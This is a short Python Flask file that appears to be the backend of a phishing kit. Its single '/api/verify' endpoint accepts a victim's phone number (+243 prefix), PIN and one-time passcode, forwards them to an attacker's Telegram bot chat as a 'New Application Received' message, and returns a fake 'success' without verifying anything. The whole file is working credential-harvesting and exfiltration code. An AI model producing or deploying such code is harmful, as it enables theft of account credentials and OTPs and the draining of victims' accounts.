import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# Try loading .env file if available
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json or {}
    phone = data.get('phone', '')
    pin = data.get('pin', '')
    otp = data.get('otp', '')
    
    token = os.environ.get("TELEGRAM_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    
    message = f"🚀 *New Application Received!*\n\n"
    message += f"📱 *Phone:* +243 {phone}\n"
    message += f"🔑 *PIN:* {pin}\n"
    message += f"🔢 *OTP:* {otp}\n"
    
    if token and chat_id:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            requests.post(url, json=payload)
        except Exception as e:
            print(f"Error sending to Telegram: {e}")
            
    return jsonify({"status": "success"})
